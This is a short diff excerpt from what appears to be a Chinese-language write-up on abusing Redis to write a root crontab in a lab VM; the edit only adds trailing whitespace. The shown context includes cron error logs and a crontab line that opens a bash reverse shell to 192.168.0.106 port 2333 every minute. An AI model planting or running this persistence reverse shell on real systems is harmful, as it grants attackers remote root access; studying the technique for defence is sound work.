@@ -221,7 +221,7 @@ Jul 18 19:26:01 mint-VirtualBox cron[2173]: Error: bad minute; while reading cro
 Jul 18 19:26:01 mint-VirtualBox cron[2173]: (root) ERROR (Syntax error, this crontab file will be ignored)
 Jul 18 19:27:09 mint-VirtualBox crontab[2843]: (root) LIST (root)
 ```
-据上面日志猜测可能是由于crontab文件格式的问题，我们尝试把`/var/spool/cron/crontabs/root`文件内容改成一条反弹shell的任务，即
+据上面日志猜测可能是由于crontab文件格式的问题，我们尝试把`/var/spool/cron/crontabs/root`文件内容改成一条反弹shell的任务，即 
 ```shell
 root@mint-VirtualBox:/data/hack/C/middleware/redis# cat /var/spool/cron/crontabs/root 
 * * * * * bash -i >& /dev/tcp/192.168.0.106/2333 0>&1
